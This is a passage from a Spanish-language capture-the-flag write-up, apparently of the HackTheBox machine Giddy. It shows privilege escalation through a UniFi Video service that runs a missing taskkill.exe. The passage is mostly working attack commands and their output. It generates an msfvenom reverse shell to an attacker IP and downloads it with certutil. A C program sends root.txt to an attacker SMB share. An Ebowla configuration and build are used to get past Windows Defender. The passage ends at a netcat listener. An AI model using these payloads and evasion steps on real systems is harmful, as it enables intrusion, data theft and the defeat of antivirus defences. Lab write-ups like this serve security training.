+unifi-video NT AUTHORITY<span class="se">\S</span>YSTEM:<span class="o">(</span>I<span class="o">)(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>F<span class="o">)</span>
+BUILTIN<span class="se">\A</span>dministrators:<span class="o">(</span>I<span class="o">)(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>F<span class="o">)</span>
+CREATOR OWNER:<span class="o">(</span>I<span class="o">)(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>IO<span class="o">)(</span>F<span class="o">)</span>
+BUILTIN<span class="se">\U</span>sers:<span class="o">(</span>I<span class="o">)(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>RX<span class="o">)</span>
+BUILTIN<span class="se">\U</span>sers:<span class="o">(</span>I<span class="o">)(</span>CI<span class="o">)(</span>WD,AD,WEA,WA<span class="o">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Y si es correcto.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video&gt; <span class="nb">echo </span>prueba <span class="o">&gt;</span> prueba
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video&gt; <span class="nb">dir
+
+
+    </span>Directory: C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video
+
+
+Mode                LastWriteTime         Length Name
+<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
+d-----        6/16/2018   9:54 PM                bin
+d-----        6/16/2018   9:55 PM                conf
+d-----        6/16/2018  10:56 PM                data
+d-----        6/16/2018   9:54 PM                email
+d-----        6/16/2018   9:54 PM                fw
+d-----        6/16/2018   9:54 PM                lib
+d-----        4/26/2024   2:48 PM                logs
+d-----        6/16/2018   9:55 PM                webapps
+d-----        6/16/2018   9:55 PM                work
+<span class="nt">-a----</span>        7/26/2017   6:10 PM         219136 avService.exe
+<span class="nt">-a----</span>        6/17/2018  11:23 AM          31685 hs_err_pid1992.log
+<span class="nt">-a----</span>        8/16/2018   7:48 PM         270597 hs_err_pid2036.mdmp
+<span class="nt">-a----</span>        4/26/2024   4:11 PM             18 prueba
+<span class="nt">-a----</span>        6/16/2018   9:54 PM            780 Ubiquiti UniFi Video.lnk
+<span class="nt">-a----</span>        7/26/2017   6:10 PM          48640 UniFiVideo.exe
+<span class="nt">-a----</span>        7/26/2017   6:10 PM          32038 UniFiVideo.ico
+<span class="nt">-a----</span>        6/16/2018   9:54 PM          89050 Uninstall.exe
+</code></pre></div></div>
+
+<ul>
+  <li>Nos dicen que cuando arrancas el servicio arranque un <code class="language-plaintext highlighter-rouge">.exe</code> que no existe en el directorio por defecto.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Upon start and stop of the service, it tries to load and execute the file at
+<span class="s2">"C:</span><span class="se">\P</span><span class="s2">rogramData</span><span class="se">\u</span><span class="s2">nifi-video</span><span class="se">\t</span><span class="s2">askkill.exe"</span><span class="nb">.</span> However this file does not exist <span class="k">in
+</span>the application directory by default at all.
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Lo que debemos hacer es crear ese <code class="language-plaintext highlighter-rouge">.exe</code>.</p>
+  </li>
+  <li>
+    <p>Para crear binarios podemos usar <code class="language-plaintext highlighter-rouge">msfvenom</code>.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content msfvenom <span class="nt">-p</span> windows/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.216 <span class="nv">LPORT</span><span class="o">=</span>443 <span class="nt">-f</span> exe <span class="nt">-o</span> taskkill.exe
+<span class="o">[</span>-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+<span class="o">[</span>-] No <span class="nb">arch </span>selected, selecting <span class="nb">arch</span>: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of exe file: 7168 bytes
+Saved as: taskkill.exe
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora lo vamos a subir ala maquina victima.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content python3 <span class="nt">-m</span> http.server 8080
+Serving HTTP on 0.0.0.0 port 8080 <span class="o">(</span>http://0.0.0.0:8080/<span class="o">)</span> ...
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video&gt; certutil.exe <span class="nt">-f</span> <span class="nt">-urlcache</span> <span class="nt">-split</span> http://10.10.14.216:8080/taskkill.exe taskkill.exe
+<span class="k">****</span>  Online  <span class="k">****</span>
+  0000  ...
+  1c00
+CertUtil: <span class="nt">-URLCache</span> <span class="nb">command </span>completed successfully.
+</code></pre></div></div>
+
+<ul>
+  <li>Si nos ponemos en escucha y lo ejecutamos para ver si nos llega una <code class="language-plaintext highlighter-rouge">reverse shell</code> vemos el siguiente error.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video&gt; .<span class="se">\t</span>askkill.exe
+The term <span class="s1">'.\taskkill.exe'</span> is not recognized as the name of a cmdlet, <span class="k">function</span>, script file, or operable program. Check the spelling of the name, or <span class="k">if </span>a path was included, verify that the path is correct and try again.
+At line:1 char:1
++ .<span class="se">\t</span>askkill.exe
++ ~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: <span class="o">(</span>.<span class="se">\t</span>askkill.exe:String<span class="o">)</span> <span class="o">[]</span>, CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+</code></pre></div></div>
+
+<ul>
+  <li>Si lo hacemos rápido vemos que el Windows Defender lo detecta como virus.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video&gt; .<span class="se">\t</span>askkill.exe
+Program <span class="s1">'taskkill.exe'</span> failed to run: Operation did not <span class="nb">complete </span>successfully because the file contains a virus or potentially unwanted softwareAt line:1 char:1
++ .<span class="se">\t</span>askkill.exe
++ ~~~~~~~~~~~~~~.
+At line:1 char:1
++ .<span class="se">\t</span>askkill.exe
++ ~~~~~~~~~~~~~~
+    + CategoryInfo          : ResourceUnavailable: <span class="o">(</span>:<span class="o">)</span> <span class="o">[]</span>, ApplicationFailedException
+    + FullyQualifiedErrorId : NativeCommandFailed
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Vamos hacer un Bypass.</p>
+  </li>
+  <li>
+    <p>Vamos a usar <code class="language-plaintext highlighter-rouge">mingw-w64</code> <a href="https://learn.microsoft.com/es-es/vcpkg/users/platforms/mingw">https://learn.microsoft.com/es-es/vcpkg/users/platforms/mingw</a> para en vez de subir el <code class="language-plaintext highlighter-rouge">.exe</code> ala maquina vamos a crear un archivo <code class="language-plaintext highlighter-rouge">C</code> para compilar y así ya no lo detecte el defender.</p>
+  </li>
+  <li>
+    <p>Lo que podemos decirle es que nos mande la <code class="language-plaintext highlighter-rouge">flag</code> de <code class="language-plaintext highlighter-rouge">root</code> a un recurso de nosotros.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">cat </span>exc.c
+<span class="c">#include &lt;stdlib.h&gt;</span>
+
+int main<span class="o">(){</span>
+	system<span class="o">(</span><span class="s2">"type C:</span><span class="se">\\</span><span class="s2">Users</span><span class="se">\\</span><span class="s2">Administrator</span><span class="se">\\</span><span class="s2">Desktop</span><span class="se">\\</span><span class="s2">root.txt &gt; </span><span class="se">\\\\</span><span class="s2">10.10.14.216</span><span class="se">\\</span><span class="s2">smbFolder</span><span class="se">\\</span><span class="s2">root.txt"</span><span class="o">)</span><span class="p">;</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora usamos la herramienta que instalamos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content x86_64-w64-mingw32-gcc exc.c <span class="nt">-o</span> taskkill.exe
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos a mandarlo a la maquina victima otra vez.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video&gt; certutil.exe <span class="nt">-f</span> <span class="nt">-urlcache</span> <span class="nt">-split</span> http://10.10.14.216:8080/taskkill.exe taskkill.exe
+<span class="k">****</span>  Online  <span class="k">****</span>
+  000000  ...
+  01c0d2
+CertUtil: <span class="nt">-URLCache</span> <span class="nb">command </span>completed successfully.
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video&gt; <span class="nb">dir
+
+
+    </span>Directory: C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video
+
+
+Mode                LastWriteTime         Length Name
+<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
+d-----        6/16/2018   9:54 PM                bin
+d-----        6/16/2018   9:55 PM                conf
+d-----        6/16/2018  10:56 PM                data
+d-----        6/16/2018   9:54 PM                email
+d-----        6/16/2018   9:54 PM                fw
+d-----        6/16/2018   9:54 PM                lib
+d-----        4/26/2024   2:48 PM                logs
+d-----        6/16/2018   9:55 PM                webapps
+d-----        6/16/2018   9:55 PM                work
+<span class="nt">-a----</span>        7/26/2017   6:10 PM         219136 avService.exe
+<span class="nt">-a----</span>        6/17/2018  11:23 AM          31685 hs_err_pid1992.log
+<span class="nt">-a----</span>        8/16/2018   7:48 PM         270597 hs_err_pid2036.mdmp
+<span class="nt">-a----</span>        4/26/2024   4:40 PM         114898 taskkill.exe
+<span class="nt">-a----</span>        6/16/2018   9:54 PM            780 Ubiquiti UniFi Video.lnk
+<span class="nt">-a----</span>        7/26/2017   6:10 PM          48640 UniFiVideo.exe
+<span class="nt">-a----</span>        7/26/2017   6:10 PM          32038 UniFiVideo.ico
+<span class="nt">-a----</span>        6/16/2018   9:54 PM          89050 Uninstall.exe
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora iniciamos el <code class="language-plaintext highlighter-rouge">impacket-smbserver</code> por que en el script definimos que allí nos llegue la <code class="language-plaintext highlighter-rouge">flag</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-smbserver smbFolder <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span> <span class="nt">-smb2support</span>
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora tenemos que conocer el nombre del servicio para poder pararlo y arrancarlo <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/install/hklm-system-currentcontrolset-services-registry-tree">https://learn.microsoft.com/en-us/windows-hardware/drivers/install/hklm-system-currentcontrolset-services-registry-tree</a>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video&gt; <span class="nb">cd </span>HKLM:SYSTEM<span class="se">\C</span>urrentControlSet<span class="se">\S</span>ervices
+</code></pre></div></div>
+
+<ul>
+  <li>Vemos el nombre.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS HKLM:<span class="se">\S</span>YSTEM<span class="se">\C</span>urrentControlSet<span class="se">\S</span>ervices&gt; <span class="nb">dir</span> | Select-String <span class="s1">'Unifi'</span>
+
+HKEY_LOCAL_MACHINE<span class="se">\S</span>YSTEM<span class="se">\C</span>urrentControlSet<span class="se">\S</span>ervices<span class="se">\U</span>niFiVideoService
+
+
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS HKLM:<span class="se">\S</span>YSTEM<span class="se">\C</span>urrentControlSet<span class="se">\S</span>ervices
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora ya podemos parar el proceso.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS HKLM:<span class="se">\S</span>YSTEM<span class="se">\C</span>urrentControlSet<span class="se">\S</span>ervices&gt; Stop-Service <span class="nt">-Name</span> UniFiVideoService <span class="nt">-Force</span>
+Warning: Waiting <span class="k">for </span>service <span class="s1">'Ubiquiti UniFi Video (UniFiVideoService)'</span> to stop...
+Warning: Waiting <span class="k">for </span>service <span class="s1">'Ubiquiti UniFi Video (UniFiVideoService)'</span> to stop...
+Warning: Waiting <span class="k">for </span>service <span class="s1">'Ubiquiti UniFi Video (UniFiVideoService)'</span> to stop...
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS HKLM:<span class="se">\S</span>YSTEM<span class="se">\C</span>urrentControlSet<span class="se">\S</span>ervices&gt;
+</code></pre></div></div>
+
+<ul>
+  <li>Y nos llega.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-smbserver smbFolder <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span> <span class="nt">-smb2support</span>
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Incoming connection <span class="o">(</span>10.129.96.140,49729<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span><span class="se">\,</span>GIDDY<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> User GIDDY<span class="se">\ </span>authenticated successfully
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> :::00::aaaaaaaaaaaaaaaa
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Connecting Share<span class="o">(</span>1:IPC<span class="nv">$)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Connecting Share<span class="o">(</span>2:smbFolder<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Disconnecting Share<span class="o">(</span>1:IPC<span class="nv">$)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Disconnecting Share<span class="o">(</span>2:smbFolder<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Closing down connection <span class="o">(</span>10.129.96.140,49729<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Remaining connections <span class="o">[]</span>
+</code></pre></div></div>
+
+<h2 id="root-flag">root flag</h2>
+
+<ul>
+  <li>Y vemos la <code class="language-plaintext highlighter-rouge">flag</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">cat </span>root.txt
+2873baf68c08b318321f3689ca29ad7a
+</code></pre></div></div>
+
+<h2 id="shell-as-root">Shell as root</h2>
+
+<ul>
+  <li>
+    <p>Ahora vamos a ganar acceso pero con una consola.</p>
+  </li>
+  <li>
+    <p>Vamos a volver a generar el <code class="language-plaintext highlighter-rouge">.exe</code> con <code class="language-plaintext highlighter-rouge">msfvenom</code>.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content msfvenom <span class="nt">-p</span> windows/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.216 <span class="nv">LPORT</span><span class="o">=</span>443 <span class="nt">-f</span> exe <span class="nt">-o</span> taskkill.exe
+<span class="o">[</span>-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+<span class="o">[</span>-] No <span class="nb">arch </span>selected, selecting <span class="nb">arch</span>: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of exe file: 7168 bytes
+Saved as: taskkill.exe
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos arrancar el servicio otra vez.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS HKLM:<span class="se">\S</span>YSTEM<span class="se">\C</span>urrentControlSet<span class="se">\S</span>ervices&gt; cmd /c sc start UniFiVideoService
+
+SERVICE_NAME: UniFiVideoService
+        TYPE               : 10  WIN32_OWN_PROCESS
+        STATE              : 2  START_PENDING
+                                <span class="o">(</span>NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN<span class="o">)</span>
+        WIN32_EXIT_CODE    : 0  <span class="o">(</span>0x0<span class="o">)</span>
+        SERVICE_EXIT_CODE  : 0  <span class="o">(</span>0x0<span class="o">)</span>
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x7d0
+        PID                : 1148
+        FLAGS              :
+</code></pre></div></div>
+
+<ul>
+  <li>Podemos usar la siguiente herramienta para burla el defender <a href="https://github.com/Genetic-Malware/Ebowla">https://github.com/Genetic-Malware/Ebowla</a>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content git clone https://github.com/Genetic-Malware/Ebowla
+Cloning into <span class="s1">'Ebowla'</span>...
+remote: Enumerating objects: 559, <span class="k">done</span><span class="nb">.</span>
+remote: Total 559 <span class="o">(</span>delta 0<span class="o">)</span>, reused 0 <span class="o">(</span>delta 0<span class="o">)</span>, pack-reused 559
+Receiving objects: 100% <span class="o">(</span>559/559<span class="o">)</span>, 35.46 MiB | 1.29 MiB/s, <span class="k">done</span><span class="nb">.</span>
+Resolving deltas: 100% <span class="o">(</span>287/287<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
+➜  content <span class="nb">mv </span>taskkill.exe Ebowla
+➜  content <span class="nb">cd </span>Ebowla
+➜  Ebowla git:<span class="o">(</span>master<span class="o">)</span> ✗ <span class="nb">ls
+</span>Eko_2016_Morrow_Pitts_Master.pdf                  cleanup.py
+Infiltrate_2016_Morrow_Pitts_Genetic_Malware.pdf  documentation.md
+LICENSE.md                                        ebowla.py
+MemoryModule                                      encryption
+README.md                                         formats.md
+build_python.sh                                   genetic.config
+build_x64_go.sh                                   taskkill.exe
+build_x86_go.sh                                   templates
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Ahora vamos a editar el <code class="language-plaintext highlighter-rouge">genetic.config</code>.</p>
+  </li>
+  <li>
+    <p>Tiene que quedar de esta forma.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  Ebowla git:<span class="o">(</span>master<span class="o">)</span> ✗ <span class="nb">cat </span>genetic.config
+<span class="o">[</span>Overall]
+
+    <span class="c"># Options ENV, OTP</span>
+
+    Encryption_Type <span class="o">=</span> ENV
+
+
+    <span class="c"># Template output: GO, Python, OR PowerShell</span>
+
+    output_type <span class="o">=</span> GO
+
+
+    <span class="c"># Number of bytes subtracted from the reconstructed payload that will be the</span>
+    <span class="c"># sha512 checksum used when checking the file before executing the payload.</span>
+
+    minus_bytes <span class="o">=</span> 1
+
+
+    <span class="c"># type of file being fed (payload) - also determines execution</span>
+    <span class="c"># Python: EXE, DLL_x86, DLL_x64 are written to disk</span>
+    <span class="c"># GO: Nothing is written to disk</span>
+    <span class="c"># OPTIONS for GO: EXE, DLL_x86, DLL_x64, SHELLCODE</span>
+    <span class="c"># OPTIONS for PYTHON: EXE, SHELLCODE, CODE, FILE_DROP</span>
+    <span class="c"># OPTIONS for PowerShell: CODE, DLL_x86, DLL_x64, EXE, FILE_DROP</span>
+
+    payload_type <span class="o">=</span> EXE
+
+
+    <span class="c"># key_iterations is for otp_type = key and for symmetric_settings_win</span>
+    <span class="c"># It is the number of times that the key hash is iterated via sha512 before being used</span>
+    <span class="c"># as the encryption key.  NOT available to otp_type = full</span>
+
+    key_iterations <span class="o">=</span> 10000
+
+    <span class="c"># Clean the resulting loaders from comments and print statements</span>
+    <span class="c"># This will make the runs faster and not display status information on the victim host</span>
+    <span class="c"># Most useful once payloads have been tested and are ready for deployment</span>
+    <span class="c"># Values Bool: True or False</span>
+
+    clean_output <span class="o">=</span> False
+
+
+<span class="o">[</span>otp_settings]
+    <span class="c"># otp is simple, provide one time pad, type,  and starting search location</span>
+    <span class="c"># type is full otp to reconstruct the malware in memory, or an offset in the file for a symmetric key</span>
+
+    otp_type <span class="o">=</span> key <span class="c"># OPTIONS: full, key</span>
+
+
+    <span class="c"># File for use with otp</span>
+
+    pad <span class="o">=</span> <span class="s1">'cmd.exe'</span>
+
+    <span class="c"># Max pad size: Decide the largest pad size to use.</span>
+    <span class="c"># 256 ** 3 - 1 (16777215 or 0xffffff) maximum is supported</span>
+    <span class="c"># Too small might be a bad idea...</span>
+
+    pad_max <span class="o">=</span> 0xffffff
+
+    <span class="c"># starting location in the path to start looking if walking the path</span>
+
+    scan_dir <span class="o">=</span> <span class="s1">'c:\windows\sysnative'</span><span class="c">#'%APPDATA%'</span>
+
+
+    <span class="c"># For use with FULL OTP:</span>
+    <span class="c">#  Number of max bytes for matching the payload against the OTP</span>
+    <span class="c">#  -- larger byte width equals possible smaller lookup table but longer build times</span>
+
+    byte_width <span class="o">=</span> 9
+
+
+
+<span class="o">[</span>symmetric_settings_win]
+    <span class="c"># AES-CFB-256 key from a combination of the any of the following settings.</span>
+    <span class="c"># Any of the following can be used, the more specific to your target the better.</span>
+
+
+    <span class="c"># set the value to '' if you do not want to use that value</span>
+
+
+    <span class="c"># This is not a permanent list.  Any env variable can be added below.</span>
+    <span class="c"># If you want the env variable to be used, give it a value.</span>
+    <span class="c"># These are case insensitive.</span>
+
+    <span class="o">[[</span>ENV_VAR]]
+
+        username <span class="o">=</span> <span class="s1">''</span>
+        computername <span class="o">=</span> <span class="s1">'Giddy'</span>
+        homepath <span class="o">=</span> <span class="s1">''</span>
+        homedrive <span class="o">=</span> <span class="s1">''</span>
+        Number_of_processors <span class="o">=</span> <span class="s1">''</span>
+        processor_identifier <span class="o">=</span> <span class="s1">''</span>
+        processor_revision <span class="o">=</span> <span class="s1">''</span>
+        userdomain <span class="o">=</span> <span class="s1">''</span>
+        systemdrive <span class="o">=</span> <span class="s1">''</span>
+        userprofile <span class="o">=</span> <span class="s1">''</span>
+        path <span class="o">=</span> <span class="s1">''</span>
+        temp <span class="o">=</span> <span class="s1">''</span>
+
+
+     <span class="o">[[</span>PATH]]
+
+    <span class="c"># Check if a path exists on the workstation</span>
+    <span class="c"># Only one path can be used.  This is immutable. To use, give it a value and a start location.</span>
+
+        <span class="c"># This is the path that will be used as part of the key</span>
+
+        path <span class="o">=</span> <span class="s1">''</span>
+
+        <span class="c"># You can provide Env Variables that are associated with a path for the start_loc</span>
+        <span class="c">#  , such as %TEMP%, %APPDATA%, %PROGRAMFILES%</span>
+    <span class="c"># You Must use the %ENV VAR% when using env vars for paths!</span>
+    <span class="c"># Examples: C:\Windows, C:\Program Files, %APPDATA%</span>
+
+    start_loc <span class="o">=</span> <span class="s1">'%HOMEPATH%'</span>
+
+
+    <span class="o">[[</span>IP_RANGES]]
+
+    <span class="c"># Network mask for external enumeration 22.23.0.0</span>
+    <span class="c"># IP mask should not be used alone more simple to brute force.</span>
+    <span class="c"># Support for only 24 16 8 masks or exact ip</span>
+    <span class="c"># 12.12.0.0 or 12.12.12.12 or 12.12.0.0 or 12.0.0.0</span>
+
+    external_ip_mask <span class="o">=</span> <span class="s1">''</span>
+
+
+    <span class="o">[[</span>SYSTEM_TIME]]
+
+    <span class="c"># Time Range with BEGING and END in EPOC</span>
+        <span class="c"># Should be used with another variable</span>
+    <span class="c"># This is a mask: 20161001 or 20161000 or 20160000</span>
+    <span class="c"># YEAR, MONTH, DAY</span>
+
+    Time_Range <span class="o">=</span> <span class="s1">''</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora lo ejecutamos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  Ebowla git:<span class="o">(</span>master<span class="o">)</span> ✗ python2 ebowla.py taskkill.exe genetic.config
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using Symmetric encryption
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Payload length 7168
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Payload_type exe
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using EXE payload template
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Used environment variables:
+	<span class="o">[</span>-] environment value used: computername, value used: giddy
+<span class="o">[!]</span> Path string not used as pasrt of key
+<span class="o">[!]</span> External IP mask NOT used as part of key
+<span class="o">[!]</span> System <span class="nb">time </span>mask NOT used as part of key
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> String used to <span class="nb">source </span>the encryption key: giddy
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Applying 10000 sha512 <span class="nb">hash </span>iterations before encryption
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Encryption key: 91798b223b0690d70e3934063458f6bd14279758a6fe1bc78ff0c7fdb489be0c
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Writing GO payload to: go_symmetric_taskkill.exe.go
+</code></pre></div></div>
+
+<ul>
+  <li>Y aquí no los guardo.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  Ebowla git:<span class="o">(</span>master<span class="o">)</span> ✗ <span class="nb">ls</span> <span class="nt">-l</span> output
+total 20
+<span class="nt">-rw-r--r--</span> 1 miguel miguel 20223 Apr 26 15:34 go_symmetric_taskkill.exe.go
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora tenemos que compilarlo.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  Ebowla git:<span class="o">(</span>master<span class="o">)</span> ✗ ./build_x64_go.sh output/go_symmetric_taskkill.exe.go taskkill_ebowla.exe
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Copy Files to tmp <span class="k">for </span>building
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Building...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Building <span class="nb">complete</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Copy taskkill_ebowla.exe to output
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Cleaning up
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Done
+</code></pre></div></div>
+
+<ul>
+  <li>Allí tenemos el binario.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  output git:<span class="o">(</span>master<span class="o">)</span> ✗ <span class="nb">ls
+</span>go_symmetric_taskkill.exe.go  taskkill_ebowla.exe
+</code></pre></div></div>
+
+<ul>
+  <li>Después de cambiarle el nombre vamos a subirlo de nuevo ala maquina victima usando el servidor <code class="language-plaintext highlighter-rouge">http</code> con <code class="language-plaintext highlighter-rouge">python3</code> que teníamos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video&gt; erase taskkill.exe
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video&gt; certutil.exe <span class="nt">-f</span> <span class="nt">-urlcache</span> <span class="nt">-split</span> http://10.10.14.216:80/taskkill.exe taskkill.exe
+<span class="k">****</span>  Online  <span class="k">****</span>
+  000000  ...
+  3dea72
+CertUtil: <span class="nt">-URLCache</span> <span class="nb">command </span>completed successfully.
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora nos ponemos en escucha.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rlwrap nc <span class="nt">-nlvp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+</code></pre></div></div>
+
+<ul>
+  <li>Pero ahora nos da otro error.</li>
